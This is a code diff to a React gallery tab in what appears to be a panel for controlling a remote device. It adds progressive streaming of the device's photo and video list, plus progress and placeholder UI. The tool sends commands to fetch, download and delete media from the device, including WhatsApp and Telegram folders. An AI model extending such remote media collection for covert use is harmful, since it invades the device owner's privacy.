@@ -32,12 +32,12 @@ const btn = (bg, disabled) => ({
 });
 
 const FILTERS = [
-  { key: 'all',   label: '🖼 All Photos' },
+  { key: 'all',   label: '🖼 All' },
   { key: 'image', label: '📷 Images' },
   { key: 'video', label: '🎬 Videos' },
 ];
 
-export default function GalleryTab({ device, sendCommand, results }) {
+export default function GalleryTab({ device, sendCommand, results, galleryStream }) {
   const deviceId = device?.deviceId;
   const isOnline = device?.isOnline;
 
@@ -53,6 +53,7 @@ export default function GalleryTab({ device, sendCommand, results }) {
   const seenResults     = useRef(new Set());
   const pendingViewer   = useRef(null);
   const pendingDownload = useRef(null);
+  const activeStreamRef = useRef(false);
 
   const sendCmd = useCallback((cmd, params = {}) => {
     if (deviceId) sendCommand(deviceId, cmd, params);
@@ -61,12 +62,39 @@ export default function GalleryTab({ device, sendCommand, results }) {
   const loadGallery = () => {
     if (!isOnline || loading) return;
     setItems([]);
-    setStatus('Loading gallery… (this may take 15–60 s for large libraries)');
+    setStatus('');
     setLoading(true);
+    activeStreamRef.current = true;
     sendCmd('get_gallery', { type: 'all', limit: 1000 });
   };
 
-  // ── Process command results ──────────────────────────────────────────
+  // ── Progressive stream from galleryStream prop ────────────────────────────
+  useEffect(() => {
+    if (!galleryStream || !activeStreamRef.current) return;
+
+    const { items: streamItems, loading: streamLoading, done, error } = galleryStream;
+
+    if (error) {
+      setLoading(false);
+      setStatus('Failed: ' + error);
+      activeStreamRef.current = false;
+      return;
+    }
+
+    // Update items progressively as each chunk arrives
+    if (streamItems && streamItems.length > 0) {
+      setItems(streamItems);
+    }
+
+    if (done) {
+      setLoading(false);
+      activeStreamRef.current = false;
+      const count = streamItems ? streamItems.length : 0;
+      setStatus(`Loaded ${count} item${count !== 1 ? 's' : ''}`);
+    }
+  }, [galleryStream]);
+
+  // ── Process command results (lightbox thumbnail, download, delete) ────────
   useEffect(() => {
     if (!results || results.length === 0) return;
     results.forEach(r => {
@@ -77,18 +105,6 @@ export default function GalleryTab({ device, sendCommand, results }) {
       try { data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response; }
       catch (_) { return; }
       if (!data) return;
-
-      // ── Gallery list (assembled from chunks by App.jsx) ──
-      if (r.command === 'get_gallery') {
-        setLoading(false);
-        if (data.success) {
-          const list = data.items || [];
-          setItems(list);
-          setStatus(`Loaded ${list.length} item${list.length !== 1 ? 's' : ''}`);
-        } else {
-          setStatus('Failed: ' + (data.error || 'unknown error'));
-        }
-      }
 
       // ── Larger thumbnail for lightbox ──
       if (r.command === 'get_gallery_thumbnail') {
@@ -184,6 +200,9 @@ export default function GalleryTab({ device, sendCommand, results }) {
     video: items.filter(i => i.type === 'video').length,
   };
 
+  const streamedCount = galleryStream?.items?.length || 0;
+  const isStreaming = loading && streamedCount > 0;
+
   return (
     <div style={{ display: 'flex', flexDirection: 'column', height: '100%', background: '#0f172a', color: '#e2e8f0', fontFamily: 'system-ui,sans-serif' }}>
 
@@ -199,16 +218,38 @@ export default function GalleryTab({ device, sendCommand, results }) {
         </button>
       </div>
 
-      {/* Status */}
-      {status && (
+      {/* Live progress bar while streaming */}
+      {loading && (
+        <div style={{ flexShrink: 0 }}>
+          <div style={{ height: 3, background: '#1e293b', overflow: 'hidden' }}>
+            <div style={{
+              height: '100%',
+              background: 'linear-gradient(90deg, #6366f1, #818cf8, #6366f1)',
+              backgroundSize: '200% 100%',
+              animation: isStreaming ? 'none' : 'gallery-shimmer 1.5s linear infinite',
+              width: isStreaming ? `${Math.min(95, (streamedCount / 10))}%` : '40%',
+              transition: 'width 0.4s ease',
+            }} />
+          </div>
+          <div style={{ padding: '5px 18px', background: '#0f172a', fontSize: 12, color: '#6366f1', display: 'flex', alignItems: 'center', gap: 8 }}>
+            <span style={{ display: 'inline-block', animation: 'gallery-pulse 1s ease-in-out infinite' }}>●</span>
+            {isStreaming
+              ? `Receiving… ${streamedCount} item${streamedCount !== 1 ? 's' : ''} so far`
+              : 'Scanning device media…'}
+          </div>
+        </div>
+      )}
+
+      {/* Status bar (shown when not loading) */}
+      {status && !loading && (
         <div style={{ padding: '6px 18px', background: '#1e293b', fontSize: 12, color: '#94a3b8', borderBottom: '1px solid #1e293b', flexShrink: 0 }}>
           {status}
         </div>
       )}
 
-      {/* Filter buttons */}
+      {/* Filter buttons — show even while loading once items start arriving */}
       {items.length > 0 && (
-        <div style={{ display: 'flex', gap: 6, padding: '10px 18px', borderBottom: '1px solid #1e293b', flexShrink: 0, flexWrap: 'wrap' }}>
+        <div style={{ display: 'flex', gap: 6, padding: '10px 18px', borderBottom: '1px solid #1e293b', flexShrink: 0, flexWrap: 'wrap', alignItems: 'center' }}>
           {FILTERS.map(f => (
             <button key={f.key} onClick={() => setFilter(f.key)} style={{
               ...btn(filter === f.key ? '#6366f1' : '#1e293b', false),
@@ -217,13 +258,18 @@ export default function GalleryTab({ device, sendCommand, results }) {
               {f.label} <span style={{ fontSize: 11, opacity: 0.7 }}>({counts[f.key]})</span>
             </button>
           ))}
+          {loading && (
+            <span style={{ fontSize: 11, color: '#6366f1', marginLeft: 6, animation: 'gallery-pulse 1s ease-in-out infinite' }}>
+              ● streaming…
+            </span>
+          )}
         </div>
       )}
 
       {/* Content */}
       <div style={{ flex: 1, overflowY: 'auto', padding: 12 }}>
 
-        {/* Idle */}
+        {/* Idle — not loading, no items */}
         {!loading && items.length === 0 && (
           <div style={{ textAlign: 'center', padding: 60, color: '#475569' }}>
             <div style={{ fontSize: 48, marginBottom: 12 }}>🖼️</div>
@@ -239,19 +285,21 @@ export default function GalleryTab({ device, sendCommand, results }) {
           </div>
         )}
 
-        {/* Loading */}
-        {loading && (
+        {/* Initial loading spinner — shown only before first items arrive */}
+        {loading && items.length === 0 && (
           <div style={{ textAlign: 'center', padding: 60, color: '#475569' }}>
-            <div style={{ fontSize: 36, marginBottom: 12, animation: 'gallery-spin 1.2s linear infinite', display: 'inline-block' }}>⌛</div>
+            <div style={{ fontSize: 36, marginBottom: 12 }}>
+              <span style={{ display: 'inline-block', animation: 'gallery-spin 1.2s linear infinite' }}>⌛</span>
+            </div>
             <div style={{ fontSize: 14 }}>Scanning device media…</div>
             <div style={{ fontSize: 12, marginTop: 6, color: '#334155' }}>
-              This includes DCIM, Pictures, WhatsApp, Telegram, and all app folders.
+              Photos will appear as they are received
             </div>
           </div>
         )}
 
-        {/* Grid */}
-        {!loading && displayed.length > 0 && (
+        {/* Grid — shown as soon as items start arriving, including while still loading */}
+        {displayed.length > 0 && (
           <div style={{
             display: 'grid',
             gridTemplateColumns: 'repeat(auto-fill, minmax(120px, 1fr))',
@@ -264,6 +312,16 @@ export default function GalleryTab({ device, sendCommand, results }) {
                 onOpen={openLightbox}
                 isDeleting={deleting.has(item.path)}
               />
+            ))}
+            {/* Skeleton placeholders at the end while still streaming */}
+            {loading && [...Array(6)].map((_, i) => (
+              <div key={`skel-${i}`} style={{
+                aspectRatio: '1', borderRadius: 8,
+                background: 'linear-gradient(90deg, #1e293b 25%, #273449 50%, #1e293b 75%)',
+                backgroundSize: '200% 100%',
+                animation: 'gallery-shimmer 1.5s linear infinite',
+                border: '1px solid #334155',
+              }} />
             ))}
           </div>
         )}
@@ -278,6 +336,8 @@ export default function GalleryTab({ device, sendCommand, results }) {
 
       <style>{`
         @keyframes gallery-spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes gallery-shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+        @keyframes gallery-pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         .gallery-thumb { transition: transform 0.15s, box-shadow 0.15s; }
         .gallery-thumb:hover { transform: scale(1.05); box-shadow: 0 4px 16px rgba(0,0,0,0.5); z-index: 1; position: relative; }
       `}</style>
@@ -314,7 +374,7 @@ function GalleryThumb({ item, onOpen, isDeleting }) {
       }}
     >
       {src ? (
-        <img src={src} alt={item.name} style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }} />
+        <img src={src} alt={item.name} style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }} loading="lazy" />
       ) : (
         <div style={{ width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 32, color: '#334155' }}>
           {item.type === 'video' ? '🎬' : '🖼'}
@@ -332,17 +392,6 @@ function GalleryThumb({ item, onOpen, isDeleting }) {
           {formatDuration(item.duration)}
         </div>
       )}
-
-      {/* Hover name tooltip */}
-      <div style={{
-        position: 'absolute', bottom: 0, left: 0, right: 0,
-        background: 'linear-gradient(transparent, rgba(0,0,0,0.75))',
-        padding: '10px 4px 4px', fontSize: 9, color: '#e2e8f0',
-        overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
-        opacity: 0,
-      }} className="gallery-thumb-name">
-        {item.name}
-      </div>
     </div>
   );
 }
